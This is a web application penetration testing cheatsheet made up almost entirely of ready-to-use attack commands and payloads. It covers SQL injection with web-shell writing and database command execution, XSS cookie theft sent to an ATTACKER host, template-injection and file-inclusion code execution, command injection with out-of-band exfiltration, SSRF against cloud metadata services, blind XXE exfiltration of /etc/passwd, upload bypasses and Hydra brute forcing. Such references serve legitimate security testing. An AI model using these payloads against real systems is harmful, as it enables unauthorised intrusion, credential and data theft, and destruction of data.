# Web Application Penetration Testing Cheatsheet

## Reconnaissance

```bash
# Directory brute force
ffuf -u http://TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,301,302,403 -t 50
gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt -t 50

# Extension fuzzing
ffuf -u http://TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -e .php,.asp,.aspx,.jsp,.py,.txt,.bak,.old

# Virtual host discovery
ffuf -u http://TARGET -H "Host: FUZZ.TARGET" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs SIZE_TO_FILTER

# Parameter discovery
ffuf -u http://TARGET/page?FUZZ=test -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc 200 -fs SIZE_TO_FILTER

# Technology fingerprinting
whatweb TARGET
curl -sI TARGET | grep -iE "server|x-powered|x-aspnet|x-generator|set-cookie"
```

## SQL Injection

### Detection
```
# String-based: ' " %27 %22
# Numeric: 1 OR 1=1 -- / 1 AND 1=2 --
# Error-based: ' AND 1=CONVERT(int,@@version)--
# Time-based: ' OR SLEEP(5)-- / '; WAITFOR DELAY '0:0:5'--
# Boolean-based: ' AND 1=1-- (true) vs ' AND 1=2-- (false)
```

### MySQL
```sql
-- Version & user
' UNION SELECT NULL,version(),user()--
' UNION SELECT NULL,@@version,current_user()--

-- Enumerate databases
' UNION SELECT NULL,schema_name,NULL FROM information_schema.schemata--

-- Enumerate tables
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema='dbname'--

-- Enumerate columns
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--

-- Extract data
' UNION SELECT NULL,username,password FROM users--

-- File read/write
' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL--
' INTO OUTFILE '/var/www/html/shell.php' FIELDS TERMINATED BY '<?php system($_GET["cmd"]); ?>'--

-- Stacked queries (if supported)
'; DROP TABLE users;--

-- WAF bypass
/*!50000UNION*//*!50000SELECT*/  -- MySQL version-specific comments
UnIoN SeLeCt  -- mixed case
UN/**/ION SE/**/LECT  -- inline comments
```

### PostgreSQL
```sql
-- Version
' UNION SELECT NULL,version()--

-- Tables
' UNION SELECT NULL,tablename FROM pg_tables WHERE schemaname='public'--

-- Columns
' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users'--

-- Command execution
'; COPY (SELECT '') TO PROGRAM 'id > /tmp/out';--
'; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id';--

-- File read
'; SELECT pg_read_file('/etc/passwd');--
```

### MSSQL
```sql
-- Version
' UNION SELECT NULL,@@version--

-- Tables
' UNION SELECT NULL,name FROM sysobjects WHERE xtype='U'--

-- Command execution (xp_cmdshell)
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;--
'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--
'; EXEC xp_cmdshell 'whoami';--

-- OLE Automation (alternative to xp_cmdshell)
DECLARE @s INT; EXEC sp_oacreate 'wscript.shell',@s OUT;
EXEC sp_oamethod @s,'run',NULL,'cmd /c whoami > C:\out.txt';
```

### sqlmap
```bash
sqlmap -u "http://TARGET/page?id=1" --batch --dbs
sqlmap -u "http://TARGET/page?id=1" -D dbname --tables
sqlmap -u "http://TARGET/page?id=1" -D dbname -T users --dump
sqlmap -u "http://TARGET/page?id=1" --os-shell
sqlmap -u "http://TARGET/page?id=1" --file-read="/etc/passwd"

# POST request
sqlmap -u "http://TARGET/login" --data "user=admin&pass=test" -p user

# With cookies/headers
sqlmap -u "http://TARGET/page?id=1" --cookie "session=abc" --headers "X-Custom: val"

# Tamper scripts (WAF bypass)
sqlmap -u "http://TARGET/page?id=1" --tamper=space2comment,between,randomcase
```

## Cross-Site Scripting (XSS)

### Reflected / Stored
```html
<!-- Basic -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>

<!-- Filter bypass -->
<ScRiPt>alert(1)</ScRiPt>
<img src=x onerror="&#97;lert(1)">
<svg/onload=alert(1)>
"><img src=x onerror=alert(1)>
'><script>alert(1)</script>
javascript:alert(1)

<!-- Event handlers -->
<div onmouseover="alert(1)">hover</div>
<input onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>

<!-- DOM XSS sinks -->
document.write(location.hash)
element.innerHTML = user_input
eval(user_input)
setTimeout(user_input)
```

### Cookie Theft / Session Hijack
```html
<script>fetch('https://ATTACKER/steal?c='+document.cookie)</script>
<img src=x onerror="new Image().src='https://ATTACKER/steal?c='+document.cookie">
```

## Server-Side Template Injection (SSTI)

```
# Detection: {{7*7}} → 49 means template injection

# Jinja2 (Python/Flask)
{{config}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()}}

# Twig (PHP)
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}

# Freemarker (Java)
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

# ERB (Ruby)
<%= system("id") %>
<%= `id` %>
```

## Local/Remote File Inclusion (LFI/RFI)

```
# Basic LFI
../../../etc/passwd
....//....//....//etc/passwd  (double encoding bypass)
..%252f..%252f..%252fetc/passwd  (double URL encoding)

# PHP wrappers
php://filter/convert.base64-encode/resource=index.php
php://input  (POST body as PHP code)
data://text/plain,<?php system('id'); ?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
expect://id

# Log poisoning (LFI → RCE)
# 1. Inject PHP into logs: curl -H "User-Agent: <?php system(\$_GET['c']); ?>" http://TARGET
# 2. Include log: ?file=../../../var/log/apache2/access.log&c=id

# /proc/self/environ (if accessible)
# Inject PHP in User-Agent, then include /proc/self/environ

# Session poisoning
# 1. Set session var with PHP code
# 2. Include /var/lib/php/sessions/sess_SESSIONID
```

## Command Injection

```bash
# Separators
; id
| id
|| id
& id
&& id
`id`
$(id)
\nid

# Space bypass
{cat,/etc/passwd}
cat${IFS}/etc/passwd
cat$IFS$9/etc/passwd
X=$'cat\x20/etc/passwd'&&$X

# Keyword bypass
c'a't /etc/passwd
c"a"t /etc/passwd
\c\a\t /etc/passwd
cat /etc/pass??
cat /etc/passw*

# Blind injection (no output)
; sleep 5                       # time-based
; curl http://ATTACKER/$(whoami)  # out-of-band
; ping -c 1 ATTACKER             # DNS/ICMP
```

## SSRF (Server-Side Request Forgery)

```
# Basic
http://127.0.0.1
http://localhost
http://[::1]
http://0.0.0.0
http://0x7f000001
http://2130706433  (decimal)

# Cloud metadata
http://169.254.169.254/latest/meta-data/  (AWS)
http://169.254.169.254/metadata/instance?api-version=2021-02-01  (Azure, requires header)
http://metadata.google.internal/computeMetadata/v1/  (GCP, requires header)

# DNS rebinding
# Use service like rebind.it or 1u.ms to create DNS that resolves to 127.0.0.1

# Protocol smuggling
gopher://127.0.0.1:6379/_SET%20shell%20%22<%3Fphp%20system(%24_GET['c'])%3B%3F>%22
dict://127.0.0.1:6379/SET:shell:payload

# Bypass filters
http://127.1
http://127.0.0.1.nip.io
http://spoofed.burpcollaborator.net (points to 127.0.0.1)
```

## File Upload Bypass

```
# Extension bypass
shell.php → shell.php5 / shell.phtml / shell.phar / shell.phps
shell.asp → shell.aspx / shell.ashx / shell.asmx
shell.jsp → shell.jspx / shell.jsw / shell.jsv

# Double extension
shell.php.jpg
shell.jpg.php

# Null byte (old PHP < 5.3.4)
shell.php%00.jpg

# MIME type bypass
Content-Type: image/jpeg  (but file is .php)

# Magic bytes
GIF89a; <?php system($_GET['c']); ?>
(starts with valid image header)

# .htaccess upload
AddType application/x-httpd-php .jpg
# Then upload shell.jpg with PHP code

# Race condition
# Upload file → race to execute before server moves/deletes it
```

## XXE (XML External Entity)

```xml
<!-- File read -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>

<!-- SSRF -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">

<!-- Out-of-band (blind XXE) -->
<!ENTITY % dtd SYSTEM "http://ATTACKER/evil.dtd">
%dtd;
<!-- evil.dtd: -->
<!-- <!ENTITY % file SYSTEM "file:///etc/passwd"> -->
<!-- <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER/?d=%file;'>"> -->
<!-- %eval; %exfil; -->

<!-- PHP base64 wrapper -->
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
```

## Useful Headers & Bypass

```
# Authentication bypass
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Original-URL: /admin
X-Rewrite-URL: /admin

# Method override
X-HTTP-Method-Override: PUT
X-Method-Override: DELETE

# WAF bypass
Transfer-Encoding: chunked
Content-Type: multipart/form-data

# CORS misconfiguration test
Origin: https://evil.com
# If response has: Access-Control-Allow-Origin: https://evil.com → vulnerable

# Cache poisoning
X-Forwarded-Host: evil.com
X-Host: evil.com
```

## Password Attacks

```bash
# Hydra (HTTP form)
hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt TARGET http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"

# Hydra (SSH)
hydra -l root -P wordlist.txt ssh://TARGET

# Hydra (FTP)
hydra -l admin -P wordlist.txt ftp://TARGET

# ffuf (web forms)
ffuf -u http://TARGET/login -X POST -d "user=admin&pass=FUZZ" -w wordlist.txt -H "Content-Type: application/x-www-form-urlencoded" -fc 401

# Default credentials — always check:
# admin:admin, admin:password, root:root, admin:changeme
# test:test, guest:guest, user:user
```
